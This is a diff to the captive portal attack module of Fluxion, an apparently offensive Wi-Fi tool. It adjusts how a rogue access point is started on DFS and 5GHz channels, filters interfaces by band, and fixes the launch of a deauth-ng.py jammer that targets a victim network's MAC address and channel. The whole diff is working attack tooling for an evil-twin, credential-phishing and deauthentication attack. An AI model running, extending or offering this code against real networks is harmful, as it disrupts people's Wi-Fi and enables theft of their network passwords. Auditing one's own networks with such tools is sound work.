@@ -182,7 +182,16 @@ function captive_portal_set_ap_service() {
   fi
 
   if [ "$FLUXIONAuto" ]; then
-    CaptivePortalAPService="hostapd"
+    if [ "$FLUXIONAPService" ]; then
+      CaptivePortalAPService="$FLUXIONAPService"
+    # DFS channels (52-64, 100-144) require airbase-ng since hostapd
+    # needs driver CAC/radar support which USB adapters lack.
+    elif [ "$FluxionTargetChannel" -ge 52 -a "$FluxionTargetChannel" -le 64 ] 2>/dev/null || \
+         [ "$FluxionTargetChannel" -ge 100 -a "$FluxionTargetChannel" -le 144 ] 2>/dev/null; then
+      CaptivePortalAPService="airbase-ng"
+    else
+      CaptivePortalAPService="hostapd"
+    fi
   else
     fluxion_header
 
@@ -1135,7 +1144,7 @@ captive_portal_generic() {
     </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
 
-if [ $FLUXIONEnable5GHZ -eq 1 ];then
+if [ $FLUXIONEnable5GHZ -eq 1 ]; then
     cp -r "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
     chmod +x "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
 fi
@@ -1171,7 +1180,7 @@ captive_portal_unset_routes() {
 captive_portal_set_routes() {
   # Give an address to the gateway interface in the rogue network.
   # This makes the interface accessible from the rogue network.
-  ip addr add "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface"
+  ip addr add "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
 
   # Save the system's routing state to restore later.
   cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"
@@ -1208,7 +1217,7 @@ captive_portal_stop_interface() {
 captive_portal_start_interface() {
   if [ "$CaptivePortalAPService" ]; then
     echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
-    ap_service_start
+    ap_service_start || return 1
   else
     fluxion_header
 
@@ -1296,9 +1305,21 @@ attack_targetting_interfaces() {
 }
 
 attack_tracking_interfaces() {
+  # Determine required band from target channel.
+  local __requiredBand=""
+  if [ "$FluxionTargetChannel" ]; then
+    local __ch=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+    if [ -n "$__ch" ] && [ "$__ch" -gt 14 ]; then
+      __requiredBand="5GHz"
+    fi
+  fi
   interface_list_wireless
   local interface
   for interface in "${InterfaceListWireless[@]}"; do
+    if [ "$__requiredBand" ]; then
+      interface_bands "$interface" 2>/dev/null
+      if [[ "${InterfaceBands:-}" != *"$__requiredBand"* ]]; then continue; fi
+    fi
     echo "$interface"
   done
   echo "" # This enables the Skip option.
@@ -1420,7 +1441,7 @@ captive_portal_start_jammer_service() {
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-      "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
+      "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
   elif [[ $option_deauth -eq 1 ]]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
